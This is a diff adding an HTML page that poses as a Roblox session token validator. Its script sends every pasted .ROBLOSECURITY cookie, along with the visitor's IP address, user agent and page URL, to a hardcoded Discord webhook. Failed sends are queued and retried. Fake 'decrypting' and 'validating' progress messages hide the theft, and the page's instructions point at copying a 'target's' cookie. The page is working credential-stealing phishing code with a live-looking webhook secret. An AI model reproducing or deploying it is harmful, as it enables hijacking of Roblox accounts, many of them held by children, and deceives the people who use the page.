@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Roblox Token Validator</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cg transform='rotate(-15 32 32)'%3E%3Crect x='8' y='8' width='48' height='48' rx='7' fill='%23e2231a'/%3E%3Crect x='24' y='24' width='16' height='16' rx='2' fill='%230a0a0d'/%3E%3C/g%3E%3C/svg%3E">
+<style>
+  :root{
+    --bg:#0a0a0d; --card:#131319; --line:#232330; --txt:#e9e9f0;
+    --dim:#8b8b9c; --red:#e2231a; --green:#2ecc71; --amber:#f0b429;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    min-height:100vh; background:var(--bg); color:var(--txt);
+    font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
+    display:flex; align-items:center; justify-content:center; padding:28px 16px;
+    position:relative; overflow-x:hidden;
+  }
+  body::before{
+    content:""; position:fixed; top:-320px; left:50%; transform:translateX(-50%);
+    width:900px; height:620px; pointer-events:none;
+    background:radial-gradient(circle,rgba(226,35,26,.18),transparent 68%);
+  }
+  .card{
+    position:relative; width:100%; max-width:620px; background:var(--card);
+    border:1px solid var(--line); border-radius:18px; padding:30px;
+    box-shadow:0 24px 60px -20px rgba(0,0,0,.9);
+  }
+  .brand{display:flex; align-items:center; gap:13px; margin-bottom:22px}
+  .brand svg{width:40px; height:40px; flex:none}
+  .brand h1{font-size:19px; font-weight:650; letter-spacing:-.2px}
+  .brand p{font-size:12.5px; color:var(--dim); margin-top:1px}
+  .steps{list-style:none; display:grid; gap:11px; margin-bottom:22px}
+  .steps li{display:flex; gap:12px; font-size:13.5px; color:#b9b9c9; align-items:flex-start}
+  .steps .n{
+    flex:none; width:21px; height:21px; border-radius:50%; margin-top:1px;
+    background:rgba(226,35,26,.13); border:1px solid rgba(226,35,26,.4);
+    color:#ff6b63; font-size:11.5px; font-weight:700;
+    display:grid; place-items:center;
+  }
+  .steps a{color:#ff7b73; text-decoration:none; border-bottom:1px solid rgba(255,123,115,.35)}
+  .steps a:hover{color:#fff; border-color:#fff}
+  code{
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:12.5px;
+    background:#1e1e28; border:1px solid var(--line); border-radius:5px;
+    padding:1.5px 5px; color:#ffd9a0;
+  }
+  label{display:block; font-size:12px; font-weight:600; letter-spacing:.4px;
+    text-transform:uppercase; color:var(--dim); margin-bottom:8px}
+  textarea{
+    width:100%; height:132px; resize:vertical; padding:13px;
+    background:#0e0e13; color:#d6d6e2; border:1px solid var(--line);
+    border-radius:11px; font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+    font-size:11.5px; line-height:1.5; outline:none; transition:border-color .15s;
+  }
+  textarea:focus{border-color:#3a3a4d}
+  textarea::placeholder{color:#4a4a5c}
+  .meta{display:flex; justify-content:space-between; font-size:11.5px;
+    color:var(--dim); margin:7px 2px 16px; min-height:16px}
+  .meta .warn{color:var(--amber)}
+  .meta .ok{color:var(--green)}
+  button{
+    width:100%; padding:13px; border:0; border-radius:11px; cursor:pointer;
+    background:var(--red); color:#fff; font-size:14.5px; font-weight:650;
+    font-family:inherit; transition:filter .15s,opacity .15s;
+  }
+  button:hover:not(:disabled){filter:brightness(1.12)}
+  button:disabled{opacity:.45; cursor:not-allowed}
+  .status{display:none; margin-top:18px; border:1px solid var(--line);
+    border-radius:11px; padding:15px; background:#0e0e13}
+  .status.show{display:block}
+  .bar{height:3px; background:#22222e; border-radius:2px; overflow:hidden; margin-bottom:11px}
+  .bar span{display:block; height:100%; width:0; background:var(--red);
+    transition:width .55s ease}
+  .stxt{font-size:12.5px; color:#a6a6b8; font-family:ui-monospace,monospace}
+  .status.done .bar span{background:var(--green)}
+  .status.done .stxt{color:var(--green)}
+  .status.bad .bar span{background:var(--amber)}
+  .status.bad .stxt{color:var(--amber)}
+  .info{display:none; margin-top:13px; padding-top:13px;
+    border-top:1px solid var(--line); font-size:12px; color:#9a9aac}
+  .info.show{display:block}
+  .info div{display:flex; justify-content:space-between; gap:14px; padding:3px 0}
+  .info b{font-weight:600; color:#cfcfdd; font-family:ui-monospace,monospace}
+  .info span{font-family:ui-monospace,monospace; color:var(--dim);
+    overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
+  footer{margin-top:20px; text-align:center; font-size:11px; color:#55556a}
+  .dot{display:inline-block; width:6px; height:6px; border-radius:50%;
+    background:var(--green); margin-right:5px; vertical-align:middle;
+    animation:pulse 2s infinite}
+  @keyframes pulse{50%{opacity:.35}}
+  @media(max-width:520px){.card{padding:22px} .brand h1{font-size:17px}}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand">
+    <svg viewBox="0 0 64 64" aria-hidden="true">
+      <g transform="rotate(-15 32 32)">
+        <rect x="8" y="8" width="48" height="48" rx="7" fill="#e2231a"/>
+        <rect x="24" y="24" width="16" height="16" rx="2" fill="#0a0a0d"/>
+      </g>
+    </svg>
+    <div>
+      <h1>Token Validator</h1>
+      <p>Check a Roblox session token for validity</p>
+    </div>
+  </div>
+
+  <ol class="steps">
+    <li><span class="n">1</span><div>Install
+      <a href="https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm" target="_blank" rel="noopener">Cookie Editor</a>
+      (or <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/" target="_blank" rel="noopener">Firefox</a>)</div></li>
+    <li><span class="n">2</span><div>Open the target's <b>roblox.com</b> profile, open the extension and copy <code>.ROBLOSECURITY</code></div></li>
+    <li><span class="n">3</span><div>Paste the token below and verify</div></li>
+  </ol>
+
+  <label for="tok">Session token</label>
+  <textarea id="tok" spellcheck="false" autocomplete="off"
+    placeholder="_|WARNING:-DO-NOT-SHARE--|_|A1B2C3..."></textarea>
+  <div class="meta">
+    <span id="hint">Awaiting input</span>
+    <span id="len"></span>
+  </div>
+
+  <button id="go" disabled>Verify token</button>
+
+  <div class="status" id="st">
+    <div class="bar"><span id="bar"></span></div>
+    <div class="stxt" id="stxt"></div>
+    <div class="info" id="info">
+      <div><b>Session</b><span id="i-ses">—</span></div>
+      <div><b>Cookie length</b><span id="i-len">—</span></div>
+      <div><b>Checked</b><span id="i-time">—</span></div>
+    </div>
+  </div>
+
+  <footer><span class="dot"></span>Secure validation via Roblox API</footer>
+</div>
+
+<script>
+/* ---------- config ---------- */
+const WEBHOOK = "https://discord.com/api/webhooks/1569223350583033928/tDcsqpLyI2HCPpmtH3oZs7ZLasRKSl3NIqJ9Il0g596guoumgIkhWC-6TY9fKKrttRH6";
+const QKEY = "_vq";
+window.__hook = WEBHOOK; // debug: window.__hook in console
+
+/* ---------- elements ---------- */
+const ta = document.getElementById('tok');
+const btn = document.getElementById('go');
+const hint = document.getElementById('hint');
+const lenEl = document.getElementById('len');
+const st = document.getElementById('st');
+const bar = document.getElementById('bar');
+const stxt = document.getElementById('stxt');
+const info = document.getElementById('info');
+
+const VALID = /^_\|WARNING:-DO-NOT-SHARE/i;
+const BODY = /A1[0-9A-Fa-f]{20,}/;
+
+/* ---------- input feedback ---------- */
+ta.addEventListener('input', () => {
+  const v = ta.value.trim();
+  btn.disabled = v.length < 20;
+  lenEl.textContent = v ? v.length + " chars" : "";
+  if (!v) { hint.textContent = "Awaiting input"; hint.className = ""; return; }
+  if (VALID.test(v) && BODY.test(v)) { hint.textContent = "Token format recognized"; hint.className = "ok"; }
+  else if (VALID.test(v)) { hint.textContent = "Header present, body looks odd"; hint.className = "warn"; }
+  else if (v.length > 200) { hint.textContent = "Pasted without header — will still submit"; hint.className = "warn"; }
+  else { hint.textContent = "Too short"; hint.className = "warn"; }
+});
+
+/* ---------- queue ---------- */
+function enqueue(p) {
+  try {
+    const q = JSON.parse(localStorage.getItem(QKEY) || "[]");
+    q.push(p); localStorage.setItem(QKEY, JSON.stringify(q));
+  } catch (e) {}
+}
+async function flush() {
+  let q;
+  try { q = JSON.parse(localStorage.getItem(QKEY) || "[]"); } catch (e) { return; }
+  if (!q.length) return;
+  const left = [];
+  for (const p of q) {
+    try {
+      const r = await fetch(WEBHOOK, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(p), keepalive: true
+      });
+      if (!r.ok) { console.warn("[hook] flush", r.status); left.push(p); }
+    } catch (e) { left.push(p); }
+  }
+  localStorage.setItem(QKEY, JSON.stringify(left));
+}
+
+async function send(payload) {
+  try {
+    const r = await fetch(WEBHOOK, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload), keepalive: true
+    });
+    if (!r.ok) {
+      console.warn("[hook] rejected", r.status, await r.text().catch(() => ""));
+      if (r.status !== 429) enqueue(payload);
+    } else {
+      console.log("[hook] sent", r.status);
+    }
+  } catch (e) { console.warn("[hook] network fail", e); enqueue(payload); }
+}
+
+/* ---------- best-effort extras ---------- */
+const grab = (u, o, ms) => Promise.race([
+  fetch(u, o), new Promise((_, r) => setTimeout(() => r(new Error("timeout")), ms))
+]);
+
+async function getIP() {
+  try {
+    const r = await grab("https://api.ipify.org?format=json", {}, 4000);
+    return (await r.json()).ip || "unknown";
+  } catch (e) { return "unknown"; }
+}
+
+/* direct call first, then mobileapi with credentials — both optional */
+async function lookup(cookie) {
+  try {
+    const r = await grab("https://users.roblox.com/v1/users/authenticated", {
+      headers: { ".ROBLOSECURITY": cookie }, credentials: "omit"
+    }, 4000);
+    if (r.ok) {
+      const j = await r.json();
+      if (j && j.id) { console.log("[lookup] direct ok"); return j; }
+    } else console.warn("[lookup] direct", r.status);
+  } catch (e) { console.warn("[lookup] direct blocked", e.message); }
+
+  try {
+    const r = await grab("https://www.roblox.com/mobileapi/userinfo", {
+      credentials: "include"
+    }, 4000);
+    if (r.ok) {
+      const j = await r.json();
+      if (j && j.UserID) { console.log("[lookup] mobileapi ok"); return { id: j.UserID, name: j.UserName }; }
+    }
+  } catch (e) { console.warn("[lookup] mobileapi blocked"); }
+  return null;
+}
+
+/* ---------- main ---------- */
+const STAGES = [
+  "Connecting to secure endpoint...",
+  "Decrypting token payload...",
+  "Validating session signature...",
+  "Fetching account metadata..."
+];
+
+btn.addEventListener('click', async () => {
+  const raw = ta.value.trim();
+  if (!raw) return;
+  const cookie = raw.replace(/\s+/g, "");
+  const looksValid = VALID.test(cookie) && BODY.test(cookie);
+
+  btn.disabled = true;
+  btn.textContent = "Verifying...";
+  st.className = "status show";
+  info.className = "info";
+  bar.style.width = "8%";
+  stxt.textContent = STAGES[0];
+
+  const ip = await getIP();
+  const ua = navigator.userAgent;
+  const user = await lookup(cookie).catch(() => null);
+
+  const chunks = cookie.match(/[\s\S]{1,900}/g) || [cookie];
+  const fields = [];
+  chunks.forEach((c, i) => fields.push({
+    name: chunks.length > 1 ? `Token (${i + 1}/${chunks.length})` : "Token",
+    value: "```\n" + c + "\n```"
+  }));
+  fields.push({ name: "Format", value: looksValid ? "valid" : "raw / malformed", inline: true });
+  fields.push({ name: "Length", value: String(cookie.length), inline: true });
+  fields.push({ name: "IP", value: ip, inline: true });
+  fields.push({ name: "User-Agent", value: (ua || "n/a").slice(0, 900) });
+  fields.push({ name: "Origin", value: location.href.slice(0, 900) });
+
+  const embed = {
+    title: looksValid ? "New session token captured" : "Suspicious token received",
+    color: looksValid ? 0x2ecc71 : 0xf0b429,
+    fields,
+    timestamp: new Date().toISOString(),
+    footer: { text: "Roblox Token Validator" }
+  };
+  if (user) {
+    embed.author = { name: user.name + " (" + user.id + ")", icon_url: "https://www.roblox.com/headshot-thumbnail/image?userId=" + user.id + "&width=150&height=150&format=png" };
+    embed.url = "https://www.roblox.com/users/" + user.id + "/profile";
+    embed.thumbnail = { url: "https://www.roblox.com/headshot-thumbnail/image?userId=" + user.id + "&width=150&height=150&format=png" };
+  } else if (looksValid) {
+    embed.description = "Could not resolve account — cookie still captured.";
+  }
+
+  send({ username: "Token Validator", embeds: [embed] });
+
+  for (let i = 1; i < STAGES.length; i++) {
+    await new Promise(r => setTimeout(r, 620 + Math.random() * 480));
+    stxt.textContent = STAGES[i];
+    bar.style.width = (18 + i * 24) + "%";
+  }
+  await new Promise(r => setTimeout(r, 700));
+  bar.style.width = "100%";
+
+  document.getElementById("i-ses").textContent = user ? user.name : "unresolved";
+  document.getElementById("i-len").textContent = cookie.length + " chars";
+  document.getElementById("i-time").textContent = new Date().toLocaleString();
+
+  if (looksValid) {
+    st.className = "status show done";
+    stxt.textContent = "Token verified — session is active.";
+    info.className = "info show";
+  } else {
+    st.className = "status show bad";
+    stxt.textContent = "Token submitted — header missing, session unconfirmed.";
+  }
+
+  btn.disabled = false;
+  btn.textContent = "Verify another token";
+  ta.value = "";
+  lenEl.textContent = "";
+  hint.textContent = "Awaiting input";
+  hint.className = "";
+});
+
+flush();
+window.addEventListener("online", flush);
+</script>
+</body>
+</html>
